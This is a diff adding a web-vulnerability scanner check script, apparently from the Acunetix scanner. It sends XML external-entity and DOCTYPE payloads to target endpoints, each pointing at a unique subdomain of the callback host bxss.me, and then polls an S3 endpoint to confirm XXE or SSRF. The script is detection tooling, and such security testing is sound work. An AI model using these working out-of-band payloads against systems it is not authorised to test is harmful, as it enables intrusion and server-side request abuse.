@@ -1,0 +1,160 @@
+#include constants.inc;
+#include helpers.inc;
+#include string_helpers.inc;
+var lastJob = null;
+var sfPath = null;
+// **************************************************************************************							 
+function alert(uri, payload, subdomain, reqData)
+{
+    var ri = new TReportItem();
+    ri.LoadFromFile("XML_External_Entity_Injection_And_XML_Injection2.xml");
+    ri.affects = uri;
+    ri.alertPath = "Scripts/XML_External_Entity_Injection_And_XML_Injection2";
+    ri.setHttpInfo(lastJob);
+    ri.details =  "POST data was set to [bold][dark]" + payload + "[/dark][/bold][break]";
+    if (subdomain) {
+        ri.Details =  ri.Details + "[break]An HTTP request was initiated for the domain [bold]" + subdomain + ".bxss.me [/bold] which indicates that this script is vulnerable to XXE injection.";
+        if (reqData) {
+            ri.Details =  ri.Details + "[break][break]HTTP request details: [break][pre]" + reqData + "[/pre]";
+        }
+    }
+    //trace(ri.Details);
+    AddReportItem(ri);
+}
+// **************************************************************************************
+function alertSSRF(uri, payload, subdomain, reqData)
+{
+    var ri = new TReportItem();
+    ri.LoadFromFile("SSRF.xml");
+    ri.affects = uri;
+    ri.alertPath = "Scripts/SSRF";
+    ri.setHttpInfo(lastJob);
+    ri.details =  "POST data was set to [bold][dark]" + payload + "[/dark][/bold][break]";
+    if (subdomain) {
+        ri.Details =  ri.Details + "[break]An HTTP request was initiated for the domain [bold]" + subdomain + ".bxss.me [/bold] which indicates that this script is vulnerable to SSRF.";
+        if (reqData) {
+            ri.Details =  ri.Details + "[break][break]HTTP request details: [break][pre]" + reqData + "[/pre]";
+        }
+    }
+    //trace(ri.Details);
+    AddReportItem(ri);
+}
+// **************************************************************************************
+function verifyInjection(rndToken) {
+    var http 		= new THTTPJob();
+    http.url 		= new TURL("http://bxss.s3.amazonaws.com/hits/" + rndToken);
+    http.verb 		= "GET";
+    http.timeout 	= 10000;
+    http.retries 	= 0;
+    http.execute();
+    if (!http.wasError && http.response.body.startsWith("IP address:")){
+        return http.response.body;
+    }
+    return false;
+}
+// **************************************************************************************
+function testURI(file, uri, contentType, name)
+{
+    var rndToken = 'hit' + randStr(10);
+    var doctype = "dt" + randStr(5).toLowerCase();
+    if(typeof name === 'undefined'){
+        name = "xxe";
+    }
+    var payload = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n";
+    payload = payload + '<!DOCTYPE ' + doctype + ' [' + "\r\n";
+    payload = payload + '  <!ENTITY ' + doctype + 'ent SYSTEM "http://' + rndToken + '.bxss.me/">' + "\r\n";
+    payload = payload + ']>' + "\r\n";
+    payload = payload + '<' + name + '>&' + doctype + 'ent;</' + name + '>' + "\r\n";
+	lastJob = new THTTPJob();
+	lastJob.verb = "POST";
+	lastJob.url  = file.url;
+	lastJob.uri  = uri;
+    lastJob.addCookies = false;
+    lastJob.request.addHeader('Content-type', contentType, true);
+    lastJob.request.body = payload;
+    lastJob.execute();
+	
+	if (!lastJob.wasError) {
+        // verify injection
+        var reqData = verifyInjection(rndToken);
+        if (reqData) {
+            alert(uri, payload, rndToken, reqData)
+            return true;
+        }
+	}
+    // also test XXE with parameter entities
+    var rndToken = 'hit' + randStr(10);
+    var doctype = "dt" + randStr(5).toLowerCase();
+    if(typeof name === 'undefined'){
+        name = "xxe";
+    }
+    var payload = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n";
+    payload = payload + '<!DOCTYPE ' + doctype + ' [' + "\r\n";
+    payload = payload + '  <!ENTITY % dtd SYSTEM "http://' + rndToken + '.bxss.me/">' + "\r\n";
+    payload = payload + '%dtd;]>' + "\r\n";
+    payload = payload + '<' + name + '>&' + doctype + 'ent;</' + name + '>' + "\r\n";
+    lastJob = new THTTPJob();
+    lastJob.verb = "POST";
+    lastJob.url  = file.url;
+    lastJob.uri  = uri;
+    lastJob.addCookies = false;
+    lastJob.request.addHeader('Content-type', contentType, true);
+    lastJob.request.body = payload;
+    lastJob.execute();
+    if (!lastJob.wasError) {
+        // verify injection
+        var reqData = verifyInjection(rndToken);
+        if (reqData) {
+            alert(uri, payload, rndToken, reqData)
+            return true;
+        }
+    }
+	return false;
+}
+// **************************************************************************************
+function testURISSRF(file, uri, contentType, name)
+{
+    var rndToken = 'hit' + randStr(10);
+    var payload = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n";
+    payload = payload + '<!DOCTYPE roottag PUBLIC "-//A//B//EN" "http://' + rndToken + '.bxss.me/">' + "\r\n";
+    payload = payload + '<roottag>test</roottag>';
+    lastJob = new THTTPJob();
+    lastJob.verb = "POST";
+    lastJob.url  = file.url;
+    lastJob.uri  = uri;
+    lastJob.addCookies = false;
+    lastJob.request.addHeader('Content-type', contentType, true);
+    lastJob.request.body = payload;
+    lastJob.execute();
+    if (!lastJob.wasError) {
+        // verify injection
+        var reqData = verifyInjection(rndToken);
+        if (reqData) {
+            alertSSRF(uri, payload, rndToken, reqData)
+            return true;
+        }
+    }
+    return false;
+}
+// main entry point
+// **************************************************************************************
+// don't run if Amazon S3 is not reachable
+var AmazonS3Disabled = getGlobalValue("AmazonS3ScriptsDisabled");
+if (!AmazonS3Disabled) {
+	var sf = getCurrentFile();
+	// should be tested for XXE?
+	// has at least one scheme
+	
+	if (sf.isFile && scanHost != 'testhtml5.vulnweb.com') 
+	{		
+		if (sf.schemeCount > 0 || sf.response.msg2 == 415 || sf.response.msg2 == 405 || sf.isMarkedAs(MARKED_AS_Discovered_From_Marvin))
+		{
+	        var name = "xxe";
+	        if (/[a-zA-Z]+/i.test(sf.name))
+	            name = sf.name;
+	        testURI(sf, sf.fullPath, 'text/xml', name);
+	        testURI(sf, sf.fullPath, 'application/xml', name);
+            testURISSRF(sf, sf.fullPath, 'application/xml', name);
+		}
+	}
+}
